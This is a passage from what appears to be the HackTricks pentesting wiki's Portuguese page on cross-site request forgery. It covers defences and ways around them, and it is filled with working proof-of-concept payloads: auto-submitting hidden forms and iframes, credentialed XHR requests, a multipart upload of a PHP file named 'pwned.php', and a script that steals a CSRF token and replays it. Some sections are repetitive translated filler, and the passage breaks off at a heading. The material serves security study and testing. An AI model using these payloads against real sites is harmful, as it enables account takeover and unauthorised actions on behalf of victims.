# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## O que √© CSRF?

**Cross-site request forgery** (tamb√©m conhecido como CSRF) √© uma vulnerabilidade de seguran√ßa na web que permite a um atacante **induzir os usu√°rios a realizar a√ß√µes que eles n√£o pretendem realizar**.\
Isso √© feito **fazendo um usu√°rio logado** na plataforma da v√≠tima acessar um site controlado pelo atacante e a partir da√≠ **executar** c√≥digo JS malicioso, enviar formul√°rios ou recuperar "imagens" para a **conta da v√≠tima**.

### Requisitos

Para ser capaz de explorar uma vulnerabilidade CSRF, voc√™ primeiro precisa **encontrar uma a√ß√£o relevante para explorar** (alterar senha ou email, fazer a v√≠tima seguir voc√™ em uma rede social, dar a voc√™ mais privil√©gios...). A **sess√£o deve depender apenas de cookies ou do cabe√ßalho de autentica√ß√£o b√°sica HTTP**, nenhum outro cabe√ßalho pode ser usado para manipular a sess√£o. E finalmente, n√£o deve haver **par√¢metros imprevis√≠veis** na solicita√ß√£o.

V√°rias **contramedidas** podem ser implementadas para evitar essa vulnerabilidade.

### **Defesas comuns**

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Se o cookie de sess√£o estiver usando essa flag, voc√™ pode n√£o conseguir enviar o cookie de sites arbitr√°rios.
* [**Compartilhamento de recursos entre origens**](cors-bypass.md): Dependendo do tipo de solicita√ß√£o HTTP que voc√™ precisa fazer para explorar a a√ß√£o relevante, voc√™ pode levar em considera√ß√£o a **pol√≠tica CORS do site da v√≠tima**. _Observe que a pol√≠tica CORS n√£o afetar√° se voc√™ apenas quiser enviar uma solicita√ß√£o GET ou uma solicita√ß√£o POST de um formul√°rio e n√£o precisar ler a resposta._
* Solicitar a **senha** do usu√°rio para autorizar a a√ß√£o.
* Resolver um **captcha**
* Ler os cabe√ßalhos **Referrer** ou **Origin**. Se uma express√£o regular for usada, ela poder√° ser contornada, por exemplo, com:
* http://mal.net?orig=http://example.com (termina com a URL)
* http://example.com.mal.net (come√ßa com a URL)
* **Modificar** o **nome** dos **par√¢metros** da solicita√ß√£o POST ou GET
* Usar um **token CSRF** em cada sess√£o. Esse token deve ser enviado dentro da solicita√ß√£o para confirmar a a√ß√£o. Esse token pode ser protegido com CORS.

### Mapa CSRF

![](<../.gitbook/assets/image (112).png>)

## Bypass de Defesas

### De POST para GET

Talvez o formul√°rio que voc√™ deseja explorar esteja preparado para enviar uma **solicita√ß√£o POST com um token CSRF**, mas voc√™ deve **verificar** se um **GET** tamb√©m √© **v√°lido** e se, ao enviar uma solicita√ß√£o GET, o **token CSRF ainda est√° sendo validado**.

### Falta de token

Algumas aplica√ß√µes validam corretamente o token quando ele est√° presente, mas ignoram a valida√ß√£o se o token for omitido.\
Nessa situa√ß√£o, o atacante pode **remover o par√¢metro inteiro** que cont√©m o token (n√£o apenas o valor) para contornar a valida√ß√£o e realizar um ataque CSRF.

### Token CSRF n√£o est√° vinculado √† sess√£o do usu√°rio

Algumas aplica√ß√µes **n√£o validam que o token pertence √† mesma sess√£o** do usu√°rio que est√° fazendo a solicita√ß√£o. Em vez disso, a aplica√ß√£o **mant√©m um pool global de tokens** que emitiu e aceita qualquer token que apare√ßa nesse pool.\
Nessa situa√ß√£o, o atacante pode fazer login na aplica√ß√£o usando sua pr√≥pria conta, **obter um token v√°lido** e, em seguida, **enviar esse token para o usu√°rio v√≠tima** em seu ataque CSRF.

### Bypass de m√©todo

Se a solicita√ß√£o estiver usando um **m√©todo "estranho"**, verifique se a **funcionalidade de substitui√ß√£o de m√©todo** est√° funcionando.\
Por exemplo, se estiver **usando o m√©todo PUT**, voc√™ pode tentar **usar o m√©todo POST** e **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Isso tamb√©m pode funcionar enviando o **par√¢metro \_method dentro de uma solicita√ß√£o POST** ou usando os **cabe√ßalhos**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### Bypass personalizado de token de cabe√ßalho

Se a solicita√ß√£o estiver adicionando um **cabe√ßalho personalizado** com um **token** √† solicita√ß√£o como m√©todo de **prote√ß√£o CSRF**, ent√£o:

* Teste a solicita√ß√£o sem o **Token Personalizado e tamb√©m o cabe√ßalho**.
* Teste a solicita√ß√£o com um **token diferente, mas com o mesmo comprimento**.

### O token CSRF √© verificado por um cookie

Em uma varia√ß√£o adicional da vulnerabilidade anterior, alguns aplicativos **duplicam cada token em um cookie e em um par√¢metro de solicita√ß√£o**. Ou ent√£o, **definem um cookie csrf** e **verificam no backend se o token csrf enviado √© o mesmo relacionado ao cookie**.

Quando a solicita√ß√£o subsequente √© validada, o aplicativo simplesmente verifica se o **token** enviado no **par√¢metro de solicita√ß√£o corresponde** ao valor armazenado pelo **cookie**.\
Nessa situa√ß√£o, o atacante pode novamente realizar um ataque CSRF **se o site conter alguma vulnerabilidade que permita definir seu cookie CSRF para a v√≠tima, como um CRLF**.

Nesse caso, voc√™ pode definir o cookie tentando carregar uma imagem falsa e, em seguida, lan√ßar o ataque CSRF, como neste exemplo:
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
Observe que se o **token csrf estiver relacionado ao cookie de sess√£o, esse ataque n√£o funcionar√°** porque voc√™ precisar√° definir a sess√£o da v√≠tima e, portanto, estar√° atacando a si mesmo.
{% endhint %}

### Altera√ß√£o do Content-Type

De acordo com [**isso**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar solicita√ß√µes de pr√©-voo** usando o m√©todo **POST**, esses s√£o os valores permitidos para o Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

No entanto, observe que a **l√≥gica dos servidores pode variar** dependendo do **Content-Type** usado, portanto, voc√™ deve tentar os valores mencionados e outros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemplo (de [aqui](https://brycec.me/posts/corctf\_2021\_challenges)) de envio de dados JSON como text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypassar solicita√ß√£o de pr√©-voo de aplicativo/json

Como voc√™ j√° sabe, n√£o √© poss√≠vel enviar uma solicita√ß√£o POST com o Content-Type **`application/json`** via formul√°rio HTML e, se voc√™ tentar fazer isso via **`XMLHttpRequest`**, uma solicita√ß√£o de pr√©-voo √© enviada primeiro.\
No entanto, voc√™ pode tentar enviar os dados JSON usando os tipos de conte√∫do **`text/plain`** e **`application/x-www-form-urlencoded`** apenas para verificar se o backend est√° usando os dados independentemente do Content-Type.\
Voc√™ pode enviar um formul√°rio usando `Content-Type: text/plain` definindo **`enctype="text/plain"`**

Se o servidor estiver aceitando apenas o tipo de conte√∫do "application/json", voc√™ pode **enviar o tipo de conte√∫do "text/plain; application/json"** sem acionar uma solicita√ß√£o de pr√©-voo.

Voc√™ tamb√©m pode tentar **burlar** essa restri√ß√£o usando um **arquivo SWF flash**. Para mais informa√ß√µes, [**leia este post**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass de verifica√ß√£o de Referrer / Origin

**Evite o cabe√ßalho Referer**

Alguns aplicativos validam o cabe√ßalho Referer quando ele est√° presente nas solicita√ß√µes, mas **ignoram a valida√ß√£o se o cabe√ßalho for omitido**.
```markup
<meta name="referrer" content="never">
```
**Burlas de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para definir o nome de dom√≠nio do servidor na URL que o Referrer vai enviar dentro dos par√¢metros, voc√™ pode fazer:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Bypassando o m√©todo HEAD**

A primeira parte deste [**writeup do CTF**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) explica que no c√≥digo-fonte do [Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), um roteador √© configurado para **tratar as requisi√ß√µes HEAD como requisi√ß√µes GET** sem corpo de resposta - uma solu√ß√£o comum que n√£o √© exclusiva do Oak. Em vez de um manipulador espec√≠fico para lidar com as requisi√ß√µes HEAD, elas s√£o simplesmente **enviadas para o manipulador GET, mas o aplicativo remove o corpo de resposta**.

Portanto, se uma requisi√ß√£o GET estiver sendo limitada, voc√™ pode simplesmente **enviar uma requisi√ß√£o HEAD que ser√° processada como uma requisi√ß√£o GET**.

## **Exemplos de Explora√ß√£o**

### **Exfiltrando o Token CSRF**

Se um **token CSRF** estiver sendo usado como **defesa**, voc√™ pode tentar **exfiltr√°-lo** aproveitando uma vulnerabilidade de [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou uma vulnerabilidade de [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET usando tags HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Outras tags HTML5 que podem ser usadas para enviar automaticamente uma solicita√ß√£o GET s√£o:

![](<../.gitbook/assets/image (530).png>)

### Solicita√ß√£o GET de formul√°rio
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Requisi√ß√£o POST de formul√°rio

A t√©cnica de Cross-Site Request Forgery (CSRF) explora a confian√ßa que um site tem em um usu√°rio autenticado para realizar a√ß√µes indesejadas em seu nome. Uma das maneiras mais comuns de realizar um ataque CSRF √© atrav√©s de uma requisi√ß√£o POST de formul√°rio.

#### Como funciona?

1. O atacante cria uma p√°gina maliciosa contendo um formul√°rio que realiza uma a√ß√£o espec√≠fica no site alvo, como alterar a senha do usu√°rio.
2. O usu√°rio autenticado visita a p√°gina maliciosa.
3. O formul√°rio √© automaticamente enviado para o site alvo, aproveitando a sess√£o autenticada do usu√°rio.
4. O site alvo processa a requisi√ß√£o POST, acreditando que foi enviada pelo usu√°rio leg√≠timo.
5. A a√ß√£o maliciosa √© executada no site alvo, como alterar a senha do usu√°rio.

#### Preven√ß√£o

Existem v√°rias medidas que podem ser tomadas para prevenir ataques CSRF:

- Utilizar tokens CSRF: Adicionar um token √∫nico e secreto em cada formul√°rio e verificar sua validade no processamento da requisi√ß√£o POST.
- Verificar a origem da requisi√ß√£o: Validar se a requisi√ß√£o POST vem de um dom√≠nio confi√°vel.
- Utilizar cabe√ßalhos HTTP: Configurar cabe√ßalhos HTTP, como o cabe√ßalho "Referer" ou "Origin", para verificar a origem da requisi√ß√£o.
- Implementar autentica√ß√£o de dois fatores: Adicionar uma camada extra de seguran√ßa ao exigir uma segunda forma de autentica√ß√£o para realizar a√ß√µes sens√≠veis.

#### Conclus√£o

A t√©cnica de CSRF √© uma amea√ßa s√©ria √† seguran√ßa dos sites. √â importante que os desenvolvedores implementem medidas de preven√ß√£o adequadas para proteger os usu√°rios contra esse tipo de ataque.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Requisi√ß√£o POST de formul√°rio por meio de iframe

Uma t√©cnica comum para realizar um ataque de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) √© enviar uma requisi√ß√£o POST de formul√°rio por meio de um elemento `<iframe>`. Isso permite que um invasor engane o navegador do usu√°rio para que ele envie uma solicita√ß√£o n√£o autorizada em nome do usu√°rio autenticado.

O processo geral para realizar esse ataque √© o seguinte:

1. O invasor cria um site malicioso que cont√©m um formul√°rio HTML.
2. O formul√°rio √© configurado para enviar uma requisi√ß√£o POST para o alvo desejado.
3. O invasor incorpora o formul√°rio em uma p√°gina leg√≠tima usando um elemento `<iframe>`.
4. Quando um usu√°rio visita a p√°gina leg√≠tima, o formul√°rio √© carregado no `<iframe>`.
5. O navegador do usu√°rio envia automaticamente a requisi√ß√£o POST para o alvo desejado, incluindo quaisquer cookies de autentica√ß√£o v√°lidos.
6. O alvo processa a requisi√ß√£o como se fosse leg√≠tima, pois n√£o pode distinguir entre uma solicita√ß√£o enviada pelo usu√°rio ou por um atacante.

Para se proteger contra ataques CSRF, √© recomendado implementar medidas de seguran√ßa, como o uso de tokens CSRF, que s√£o valores √∫nicos gerados pelo servidor e inclu√≠dos em formul√°rios. Esses tokens s√£o verificados pelo servidor para garantir que a solicita√ß√£o seja leg√≠tima e n√£o tenha sido gerada por um atacante.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Requisi√ß√£o POST Ajax**

Uma requisi√ß√£o POST Ajax √© uma t√©cnica usada para enviar dados para um servidor sem recarregar a p√°gina. Isso √© feito usando a fun√ß√£o `$.ajax()` do jQuery ou a classe `XMLHttpRequest` do JavaScript puro.

A requisi√ß√£o POST Ajax √© frequentemente usada em ataques de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF), onde um invasor engana um usu√°rio autenticado a executar a√ß√µes indesejadas em um site sem o seu conhecimento.

Durante um ataque CSRF, o invasor cria um formul√°rio malicioso em um site controlado por ele e o envia para a v√≠tima. Quando a v√≠tima visita o site malicioso, o formul√°rio √© automaticamente enviado para o site alvo, aproveitando a sess√£o autenticada da v√≠tima. Isso permite que o invasor execute a√ß√µes em nome da v√≠tima, como fazer uma transfer√™ncia de fundos, alterar senhas ou excluir dados.

Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como tokens CSRF, que s√£o valores √∫nicos gerados pelo servidor e inclu√≠dos em formul√°rios ou cabe√ßalhos de solicita√ß√£o. O servidor verifica se o token √© v√°lido antes de processar a solicita√ß√£o.

Os testadores de penetra√ß√£o podem explorar vulnerabilidades de CSRF em um site para demonstrar a sua exist√™ncia e fornecer recomenda√ß√µes para corrigi-las.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Requisi√ß√£o POST multipart/form-data

A requisi√ß√£o POST multipart/form-data √© um tipo de requisi√ß√£o utilizada para enviar dados bin√°rios, como arquivos, atrav√©s de um formul√°rio HTML. Essa t√©cnica √© comumente utilizada em aplica√ß√µes web para o envio de arquivos de imagem, √°udio, v√≠deo, entre outros.

Nesse tipo de requisi√ß√£o, os dados s√£o divididos em v√°rias partes, cada uma com seu pr√≥prio cabe√ßalho e conte√∫do. Cada parte √© separada por um delimitador, que √© especificado no cabe√ßalho da requisi√ß√£o.

Para realizar um ataque de Cross-Site Request Forgery (CSRF) em uma requisi√ß√£o POST multipart/form-data, o invasor precisa enganar o usu√°rio para que ele execute uma a√ß√£o indesejada em um site leg√≠timo. Isso pode ser feito atrav√©s de t√©cnicas como phishing, onde o invasor envia um e-mail falso ou cria um site malicioso que se passa pelo site leg√≠timo.

Ao explorar uma vulnerabilidade CSRF em uma requisi√ß√£o POST multipart/form-data, o invasor pode realizar a√ß√µes em nome do usu√°rio autenticado, como enviar um arquivo malicioso para o servidor, alterar informa√ß√µes do usu√°rio ou executar outras a√ß√µes indesejadas.

Para proteger uma aplica√ß√£o contra ataques CSRF em requisi√ß√µes POST multipart/form-data, √© recomendado utilizar mecanismos de prote√ß√£o, como tokens CSRF. Esses tokens s√£o gerados pelo servidor e inclu√≠dos no formul√°rio HTML. Ao enviar a requisi√ß√£o, o token √© verificado pelo servidor para garantir que a requisi√ß√£o seja leg√≠tima e n√£o tenha sido gerada por um atacante.

√â importante que os desenvolvedores estejam cientes dessa vulnerabilidade e implementem as devidas medidas de seguran√ßa para proteger suas aplica√ß√µes contra ataques CSRF.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Requisi√ß√£o POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

Nesta t√©cnica, exploraremos como realizar um ataque de Cross-Site Request Forgery (CSRF) usando uma requisi√ß√£o POST multipart/form-data.

#### Introduction

#### Introdu√ß√£o

Cross-Site Request Forgery (CSRF) is an attack that tricks the victim into submitting a malicious request. This attack occurs when a malicious website or application forces the victim's browser to make a request to a target website where the victim is authenticated.

Cross-Site Request Forgery (CSRF) √© um ataque que engana a v√≠tima a enviar uma requisi√ß√£o maliciosa. Esse ataque ocorre quando um site ou aplicativo malicioso for√ßa o navegador da v√≠tima a fazer uma requisi√ß√£o para um site alvo onde a v√≠tima est√° autenticada.

#### Exploiting CSRF with multipart/form-data POST request

#### Explorando CSRF com requisi√ß√£o POST multipart/form-data

1. Identify the target website that is vulnerable to CSRF.

1. Identifique o site alvo que √© vulner√°vel a CSRF.

2. Analyze the target website's functionality and identify a form or action that performs a sensitive action, such as changing the user's password or making a financial transaction.

2. Analise a funcionalidade do site alvo e identifique um formul√°rio ou a√ß√£o que execute uma a√ß√£o sens√≠vel, como alterar a senha do usu√°rio ou realizar uma transa√ß√£o financeira.

3. Craft a malicious HTML page or email that includes a form with the target website's action URL and necessary input fields.

3. Crie uma p√°gina HTML ou e-mail malicioso que inclua um formul√°rio com a URL de a√ß√£o do site alvo e os campos de entrada necess√°rios.

4. Include a hidden input field with the CSRF token value obtained from the target website.

4. Inclua um campo de entrada oculto com o valor do token CSRF obtido do site alvo.

5. Trick the victim into visiting the malicious page or clicking on the malicious email.

5. Engane a v√≠tima para visitar a p√°gina maliciosa ou clicar no e-mail malicioso.

6. When the victim submits the form, the browser will automatically send the multipart/form-data POST request to the target website, performing the sensitive action.

6. Quando a v√≠tima enviar o formul√°rio, o navegador enviar√° automaticamente a requisi√ß√£o POST multipart/form-data para o site alvo, executando a a√ß√£o sens√≠vel.

7. The target website will process the request, considering it legitimate since it came from the victim's browser with valid authentication cookies.

7. O site alvo processar√° a requisi√ß√£o, considerando-a leg√≠tima, uma vez que veio do navegador da v√≠tima com cookies de autentica√ß√£o v√°lidos.

8. The sensitive action will be performed on behalf of the victim without their knowledge or consent.

8. A a√ß√£o sens√≠vel ser√° realizada em nome da v√≠tima sem o seu conhecimento ou consentimento.

#### Mitigating CSRF Attacks

#### Mitigando Ataques CSRF

To mitigate CSRF attacks, web developers can implement the following measures:

Para mitigar ataques CSRF, os desenvolvedores web podem implementar as seguintes medidas:

1. Implement CSRF tokens: Include unique tokens in each form or action that require user authentication. These tokens should be validated on the server-side to ensure that the request is legitimate.

1. Implemente tokens CSRF: Inclua tokens √∫nicos em cada formul√°rio ou a√ß√£o que exija autentica√ß√£o do usu√°rio. Esses tokens devem ser validados no lado do servidor para garantir que a requisi√ß√£o seja leg√≠tima.

2. Use the SameSite attribute: Set the SameSite attribute to "Strict" or "Lax" on cookies to prevent them from being sent in cross-origin requests.

2. Use o atributo SameSite: Defina o atributo SameSite como "Strict" ou "Lax" nos cookies para evitar que sejam enviados em requisi√ß√µes de origem cruzada.

3. Implement CAPTCHAs: Use CAPTCHAs to verify that the request is being made by a human and not an automated script.

3. Implemente CAPTCHAs: Use CAPTCHAs para verificar se a requisi√ß√£o est√° sendo feita por um humano e n√£o por um script automatizado.

By implementing these measures, web developers can significantly reduce the risk of CSRF attacks on their websites.

Ao implementar essas medidas, os desenvolvedores web podem reduzir significativamente o risco de ataques CSRF em seus sites.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Solicita√ß√£o POST de formul√°rio de dentro de um iframe

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when an attacker tricks a user into submitting a form without their knowledge or consent.

Quando um formul√°rio HTML √© enviado, o navegador envia uma solicita√ß√£o POST para a URL especificada. Esse comportamento pode ser explorado em um ataque de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) quando um invasor engana um usu√°rio para enviar um formul√°rio sem o seu conhecimento ou consentimento.

To execute a CSRF attack from within an iframe, the attacker can create a hidden form on their malicious website that targets the vulnerable website. When the victim visits the malicious website, the hidden form is automatically submitted without their knowledge.

Para executar um ataque CSRF de dentro de um iframe, o invasor pode criar um formul√°rio oculto em seu site malicioso que visa o site vulner√°vel. Quando a v√≠tima visita o site malicioso, o formul√°rio oculto √© enviado automaticamente sem o seu conhecimento.

To prevent this type of attack, web developers can implement measures such as using anti-CSRF tokens, which are unique tokens embedded in forms to verify the authenticity of the request. Additionally, the `SameSite` attribute can be set to `Strict` or `Lax` in cookies to restrict their usage to the same site.

Para prevenir esse tipo de ataque, os desenvolvedores web podem implementar medidas como o uso de tokens anti-CSRF, que s√£o tokens √∫nicos incorporados em formul√°rios para verificar a autenticidade da solicita√ß√£o. Al√©m disso, o atributo `SameSite` pode ser definido como `Strict` ou `Lax` nos cookies para restringir seu uso ao mesmo site.
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Roubar o Token CSRF e enviar uma requisi√ß√£o POST**

Um ataque de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) ocorre quando um invasor engana um usu√°rio autenticado a executar a√ß√µes indesejadas em um aplicativo da web no qual o usu√°rio est√° autenticado. Para realizar esse ataque, o invasor precisa roubar o token CSRF do usu√°rio e envi√°-lo em uma requisi√ß√£o POST.

Existem v√°rias maneiras de roubar o token CSRF de um usu√°rio. Alguns m√©todos comuns incluem:

- Engenharia social: o invasor pode enganar o usu√°rio para que ele clique em um link malicioso ou visite um site comprometido que execute um script para roubar o token CSRF.
- Cross-Site Scripting (XSS): se o aplicativo da web for vulner√°vel a XSS, o invasor pode injetar um script malicioso que rouba o token CSRF do usu√°rio.
- Ataques de for√ßa bruta: o invasor pode tentar adivinhar o token CSRF por meio de tentativas repetidas.

Depois de obter o token CSRF, o invasor pode envi√°-lo em uma requisi√ß√£o POST para executar a√ß√µes indesejadas em nome do usu√°rio autenticado. Isso pode incluir alterar informa√ß√µes do usu√°rio, fazer compras n√£o autorizadas ou realizar outras atividades maliciosas.

Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como:

- Usar tokens CSRF exclusivos e aleat√≥rios para cada sess√£o do usu√°rio.
- Validar o token CSRF em todas as requisi√ß√µes POST para garantir que ele seja v√°lido e corresponda ao usu√°rio autenticado.
- Implementar pol√≠ticas de SameSite para cookies para limitar a execu√ß√£o de solicita√ß√µes de origem cruzada.

Os usu√°rios tamb√©m podem tomar medidas para se proteger contra ataques CSRF, como:

- N√£o clicar em links suspeitos ou visitar sites n√£o confi√°veis.
- Manter o software do navegador e do sistema operacional atualizado para corrigir quaisquer vulnerabilidades conhecidas.
- Usar extens√µes de navegador que bloqueiam scripts maliciosos e protegem contra ataques de XSS.

Ao estar ciente dos riscos e implementar medidas de seguran√ßa adequadas, os desenvolvedores e usu√°rios podem reduzir significativamente a probabilidade de sucesso de um ataque CSRF.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o Post usando um iframe, um formul√°rio e Ajax**

